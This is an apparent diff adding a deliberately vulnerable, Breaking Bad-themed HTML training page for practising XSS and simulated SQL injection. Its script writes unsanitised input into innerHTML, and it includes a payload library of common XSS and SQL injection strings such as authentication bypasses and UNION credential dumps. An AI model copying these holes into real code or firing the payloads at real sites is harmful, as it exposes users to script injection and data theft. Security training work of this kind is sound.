@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Security Testing Page - Los Pollos Hermanos</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #FFEB3B;
+            color: #D50000;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+        }
+        .test-section {
+            margin: 20px 0;
+            padding: 15px;
+            border: 2px solid #FFB300;
+            border-radius: 5px;
+        }
+        .sql-section {
+            border-color: #dc3545;
+            background-color: #fff5f5;
+        }
+        .xss-section {
+            border-color: #28a745;
+            background-color: #f8fff8;
+        }
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .sql-button {
+            background-color: #dc3545;
+        }
+        .output {
+            margin: 10px 0;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 4px;
+            min-height: 30px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        .payload-list {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .payload-list code {
+            background: white;
+            padding: 2px 4px;
+            border-radius: 3px;
+            margin: 2px;
+            display: inline-block;
+        }
+        .tabs {
+            display: flex;
+            background: #f1f1f1;
+            border-radius: 8px 8px 0 0;
+            margin-bottom: 0;
+        }
+        .tab {
+            padding: 15px 25px;
+            background: #e9ecef;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 8px 8px 0 0;
+            margin-right: 2px;
+        }
+        .tab.active {
+            background: white;
+            color: #D50000;
+        }
+        .tab-content {
+            display: none;
+            background: white;
+            padding: 20px;
+            border-radius: 0 0 8px 8px;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Web Security Testing Lab</h1>
+        <h2>Los Pollos Hermanos - Educational Testing Environment</h2>
+        
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This page contains intentional security vulnerabilities for educational purposes only. 
+            Use only in a safe, isolated testing environment. Never deploy to production!
+        </div>
+
+        <!-- Tabs -->
+        <div class="tabs">
+            <button class="tab active" onclick="openTab(event, 'xss-tab')">Cross-Site Scripting (XSS)</button>
+            <button class="tab" onclick="openTab(event, 'sql-tab')">SQL Injection</button>
+            <button class="tab" onclick="openTab(event, 'payloads-tab')">Payload Library</button>
+        </div>
+
+        <!-- XSS Testing Tab -->
+        <div id="xss-tab" class="tab-content active">
+            <h2>🟢 Cross-Site Scripting (XSS) Testing</h2>
+            
+            <div class="grid">
+                <div>
+                    <!-- URL Parameter XSS -->
+                    <div class="test-section xss-section">
+                        <h3>1. Reflected XSS (URL Parameters)</h3>
+                        <p>Current URL parameter 'test': <span id="urlParam"></span></p>
+                        <p><strong>Try:</strong> Add <code>?test=&lt;script&gt;alert('XSS')&lt;/script&gt;</code> to the URL</p>
+                        <button onclick="testReflectedXSS()">Test Current URL</button>
+                    </div>
+
+                    <!-- Form XSS -->
+                    <div class="test-section xss-section">
+                        <h3>2. Form Input XSS</h3>
+                        <input type="text" id="userInput" placeholder="Enter XSS payload here">
+                        <button onclick="displayUserInput()">Submit</button>
+                        <div class="output" id="inputOutput"></div>
+                    </div>
+
+                    <!-- Search XSS -->
+                    <div class="test-section xss-section">
+                        <h3>3. Search XSS</h3>
+                        <input type="text" id="searchInput" placeholder="Search for menu items...">
+                        <button onclick="performSearch()">Search</button>
+                        <div class="output" id="searchOutput"></div>
+                    </div>
+                </div>
+
+                <div>
+                    <!-- DOM XSS -->
+                    <div class="test-section xss-section">
+                        <h3>4. DOM-based XSS</h3>
+                        <input type="text" id="domInput" placeholder="Enter content to display">
+                        <button onclick="updateDOM()">Update Page</button>
+                        <div class="output" id="domOutput"></div>
+                    </div>
+
+                    <!-- Comment XSS -->
+                    <div class="test-section xss-section">
+                        <h3>5. Stored XSS Simulation</h3>
+                        <textarea id="commentInput" placeholder="Leave a comment..." rows="3"></textarea>
+                        <button onclick="addComment()">Post Comment</button>
+                        <div class="output" id="commentOutput"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SQL Injection Testing Tab -->
+        <div id="sql-tab" class="tab-content">
+            <h2>🔴 SQL Injection Testing</h2>
+            
+            <div class="grid">
+                <div>
+                    <!-- Login SQL Injection -->
+                    <div class="test-section sql-section">
+                        <h3>1. Login Bypass</h3>
+                        <p>Simulate vulnerable login form:</p>
+                        <input type="text" id="loginUser" placeholder="Username">
+                        <input type="password" id="loginPass" placeholder="Password">
+                        <button class="sql-button" onclick="testLogin()">Login</button>
+                        <div class="output" id="loginOutput"></div>
+                    </div>
+
+                    <!-- Search SQL Injection -->
+                    <div class="test-section sql-section">
+                        <h3>2. Search Query Injection</h3>
+                        <p>Search products by ID or name:</p>
+                        <input type="text" id="productSearch" placeholder="Product ID or name">
+                        <button class="sql-button" onclick="searchProducts()">Search Products</button>
+                        <div class="output" id="productOutput"></div>
+                    </div>
+
+                    <!-- UNION-based SQL Injection -->
+                    <div class="test-section sql-section">
+                        <h3>3. UNION-based Information Extraction</h3>
+                        <p>Get user information by ID:</p>
+                        <input type="text" id="userIdInput" placeholder="User ID">
+                        <button class="sql-button" onclick="getUserInfo()">Get User Info</button>
+                        <div class="output" id="userInfoOutput"></div>
+                    </div>
+                </div>
+
+                <div>
+                    <!-- Order Lookup SQL Injection -->
+                    <div class="test-section sql-section">
+                        <h3>4. Order Lookup Injection</h3>
+                        <p>Look up order details:</p>
+                        <input type="text" id="orderIdInput" placeholder="Order ID">
+                        <button class="sql-button" onclick="lookupOrder()">Lookup Order</button>
+                        <div class="output" id="orderOutput"></div>
+                    </div>
+
+                    <!-- Advanced SQL Testing -->
+                    <div class="test-section sql-section">
+                        <h3>5. Advanced SQL Testing</h3>
+                        <p>Custom SQL injection testing:</p>
+                        <select id="sqlTestType">
+                            <option value="basic">Basic Error-based</option>
+                            <option value="blind">Blind SQL Injection</option>
+                            <option value="time">Time-based Blind</option>
+                            <option value="union">UNION-based</option>
+                        </select>
+                        <input type="text" id="customSqlInput" placeholder="Enter injection payload">
+                        <button class="sql-button" onclick="customSqlTest()">Test Payload</button>
+                        <div class="output" id="customSqlOutput"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Payload Library Tab -->
+        <div id="payloads-tab" class="tab-content">
+            <h2>📚 Payload Library</h2>
+            
+            <div class="grid">
+                <div>
+                    <div class="test-section xss-section">
+                        <h3>XSS Payloads</h3>
+                        <div class="payload-list">
+                            <strong>Basic XSS:</strong><br>
+                            <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
+                            <code>&lt;img src=x onerror=alert('XSS')&gt;</code><br>
+                            <code>&lt;svg onload=alert('XSS')&gt;</code><br><br>
+                            
+                            <strong>Bypassing Filters:</strong><br>
+                            <code>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</code><br>
+                            <code>&lt;script&gt;eval('ale'+'rt("XSS")')&lt;/script&gt;</code><br>
+                            <code>javascript:alert('XSS')</code><br><br>
+                            
+                            <strong>DOM Manipulation:</strong><br>
+                            <code>&lt;script&gt;document.body.style.backgroundColor='red'&lt;/script&gt;</code><br>
+                            <code>&lt;script&gt;document.title='Hacked!'&lt;/script&gt;</code><br>
+                            <code>&lt;script&gt;document.cookie&lt;/script&gt;</code><br>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <div class="test-section sql-section">
+                        <h3>SQL Injection Payloads</h3>
+                        <div class="payload-list">
+                            <strong>Authentication Bypass:</strong><br>
+                            <code>' OR '1'='1'--</code><br>
+                            <code>' OR '1'='1'/*</code><br>
+                            <code>admin'--</code><br><br>
+                            
+                            <strong>UNION-based:</strong><br>
+                            <code>' UNION SELECT NULL,NULL,NULL--</code><br>
+                            <code>' UNION SELECT username,password FROM users--</code><br>
+                            <code>' UNION SELECT version(),user(),database()--</code><br><br>
+                            
+                            <strong>Information Schema:</strong><br>
+                            <code>' UNION SELECT table_name FROM information_schema.tables--</code><br>
+                            <code>' UNION SELECT column_name FROM information_schema.columns--</code><br>
+                            
+                            <strong>Error-based:</strong><br>
+                            <code>'</code> (single quote)<br>
+                            <code>" OR 1=1--</code><br>
+                            <code>' AND (SELECT COUNT(*) FROM users)>0--</code><br>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Tab functionality
+        function openTab(evt, tabName) {
+            var i, tabcontent, tabs;
+            tabcontent = document.getElementsByClassName("tab-content");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].classList.remove("active");
+            }
+            tabs = document.getElementsByClassName("tab");
+            for (i = 0; i < tabs.length; i++) {
+                tabs[i].classList.remove("active");
+            }
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+
+        // XSS Functions
+        function testReflectedXSS() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const testParam = urlParams.get('test');
+            if (testParam) {
+                document.getElementById('urlParam').innerHTML = testParam;
+            } else {
+                document.getElementById('urlParam').innerHTML = 'No test parameter found. Add ?test=<script>alert("XSS")</script> to URL';
+            }
+        }
+
+        function displayUserInput() {
+            const input = document.getElementById('userInput').value;
+            document.getElementById('inputOutput').innerHTML = 'You entered: ' + input;
+        }
+
+        function performSearch() {
+            const searchTerm = document.getElementById('searchInput').value;
+            document.getElementById('searchOutput').innerHTML = 
+                'Search results for: ' + searchTerm + 
+                '\n\nFound items:\n- Hermanos Burger\n- Chicken Burrito\n- Curly Fries';
+        }
+
+        function updateDOM() {
+            const input = document.getElementById('domInput').value;
+            document.getElementById('domOutput').innerHTML = input;
+        }
+
+        function addComment() {
+            const comment = document.getElementById('commentInput').value;
+            const timestamp = new Date().toLocaleString();
+            const currentComments = document.getElementById('commentOutput').innerHTML;
+            document.getElementById('commentOutput').innerHTML = currentComments + 
+                '\n[' + timestamp + '] Comment: ' + comment + '\n';
+        }
+
+        // SQL Injection Functions (Simulated)
+        function testLogin() {
+            const username = document.getElementById('loginUser').value;
+            const password = document.getElementById('loginPass').value;
+            
+            // Simulate vulnerable SQL query
+            const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+            
+            let result = 'SQL Query: ' + query + '\n\n';
+            
+            // Simulate different injection scenarios
+            if (username.includes("'") || password.includes("'")) {
+                if (username.includes("' OR '1'='1'") || username.includes("admin'--")) {
+                    result += 'RESULT: Login successful! (SQL Injection successful)\n';
+                    result += 'User: admin (Administrator)\n';
+                    result += 'Access: Full admin privileges granted';
+                } else {
+                    result += 'ERROR: SQL syntax error detected\n';
+                    result += 'MySQL Error: You have an error in your SQL syntax';
+                }
+            } else {
+                result += 'RESULT: Login failed - Invalid credentials';
+            }
+            
+            document.getElementById('loginOutput').textContent = result;
+        }
+
+        function searchProducts() {
+            const search = document.getElementById('productSearch').value;
+            const query = `SELECT * FROM products WHERE id='${search}' OR name LIKE '%${search}%'`;
+            
+            let result = 'SQL Query: ' + query + '\n\n';
+            
+            if (search.includes('UNION')) {
+                result += 'UNION SELECT detected!\n\n';
+                if (search.includes('information_schema')) {
+                    result += 'RESULT: Database tables exposed:\n';
+                    result += '- users\n- products\n- orders\n- inventory_items\n- suppliers';
+                } else {
+                    result += 'RESULT: Data extraction successful:\n';
+                    result += 'admin:$2y$10$hash...\nuser1:$2y$10$hash...\nuser2:$2y$10$hash...';
+                }
+            } else if (search.includes("'")) {
+                result += 'ERROR: SQL syntax error\n';
+                result += 'Potential injection point detected!';
+            } else {
+                result += 'RESULT: Products found:\n';
+                result += '1 - Hermanos Burger - $3.79\n';
+                result += '2 - Chicken Burrito - $3.00\n';
+                result += '3 - Curly Fries - $2.50';
+            }
+            
+            document.getElementById('productOutput').textContent = result;
+        }
+
+        function getUserInfo() {
+            const userId = document.getElementById('userIdInput').value;
+            const query = `SELECT username, email, role FROM users WHERE id=${userId}`;
+            
+            let result = 'SQL Query: ' + query + '\n\n';
+            
+            if (userId.includes('UNION')) {
+                result += 'UNION injection detected!\n\n';
+                result += 'RESULT: System information exposed:\n';
+                result += 'Database: walter\n';
+                result += 'Version: MySQL 8.0.25\n';
+                result += 'User: root@localhost\n';
+                result += 'Tables: users, products, orders, suppliers';
+            } else if (userId.includes('OR') || userId.includes('1=1')) {
+                result += 'RESULT: All users dumped:\n';
+                result += '1 - admin - admin@lph.com - administrator\n';
+                result += '2 - gustavo - gfring@lph.com - manager\n';
+                result += '3 - walter - walter@example.com - user';
+            } else {
+                result += 'RESULT: User information:\n';
+                result += 'ID: ' + userId + '\n';
+                result += 'Username: user' + userId + '\n';
+                result += 'Email: user' + userId + '@example.com\n';
+                result += 'Role: customer';
+            }
+            
+            document.getElementById('userInfoOutput').textContent = result;
+        }
+
+        function lookupOrder() {
+            const orderId = document.getElementById('orderIdInput').value;
+            const query = `SELECT * FROM orders WHERE order_id='${orderId}'`;
+            
+            let result = 'SQL Query: ' + query + '\n\n';
+            
+            if (orderId.includes("'")) {
+                if (orderId.includes('UNION')) {
+                    result += 'UNION injection successful!\n\n';
+                    result += 'RESULT: Sensitive data exposed:\n';
+                    result += 'Customer: John Doe - 123 Main St\n';
+                    result += 'Customer: Jane Smith - 456 Oak Ave\n';
+                    result += 'Admin: Gustavo Fring - 308 Negra Arroyo Lane';
+                } else {
+                    result += 'ERROR: SQL syntax error\n';
+                    result += 'You have an error in your SQL syntax near \'' + orderId + '\'';
+                }
+            } else {
+                result += 'RESULT: Order details:\n';
+                result += 'Order ID: ' + orderId + '\n';
+                result += 'Customer: John Doe\n';
+                result += 'Items: 1x Hermanos Burger, 1x Curly Fries\n';
+                result += 'Total: $6.29\n';
+                result += 'Status: Completed';
+            }
+            
+            document.getElementById('orderOutput').textContent = result;
+        }
+
+        function customSqlTest() {
+            const testType = document.getElementById('sqlTestType').value;
+            const payload = document.getElementById('customSqlInput').value;
+            
+            let result = 'Test Type: ' + testType.toUpperCase() + '\n';
+            result += 'Payload: ' + payload + '\n\n';
+            
+            switch(testType) {
+                case 'basic':
+                    result += 'Testing for SQL syntax errors...\n';
+                    if (payload.includes("'") || payload.includes('"')) {
+                        result += 'ERROR: SQL syntax error detected!\n';
+                        result += 'Injection point confirmed.';
+                    } else {
+                        result += 'No syntax errors detected.';
+                    }
+                    break;
+                case 'blind':
+                    result += 'Testing blind SQL injection...\n';
+                    result += 'Response time: 0.03s (normal)\n';
+                    result += 'Testing TRUE condition: 0.03s\n';
+                    result += 'Testing FALSE condition: 0.03s\n';
+                    result += 'No significant time difference detected.';
+                    break;
+                case 'time':
+                    result += 'Testing time-based blind injection...\n';
+                    if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
+                        result += 'Time delay detected!\n';
+                        result += 'Response time: 5.2s (delayed)\n';
+                        result += 'Time-based injection confirmed!';
+                    } else {
+                        result += 'Response time: 0.03s (normal)';
+                    }
+                    break;
+                case 'union':
+                    result += 'Testing UNION-based injection...\n';
+                    if (payload.includes('UNION')) {
+                        result += 'UNION statement detected!\n';
+                        result += 'Columns matched successfully.\n';
+                        result += 'Data extraction possible!';
+                    } else {
+                        result += 'No UNION statement detected.';
+                    }
+                    break;
+            }
+            
+            document.getElementById('customSqlOutput').textContent = result;
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            testReflectedXSS();
+        });
+    </script>
+</body>
+</html>
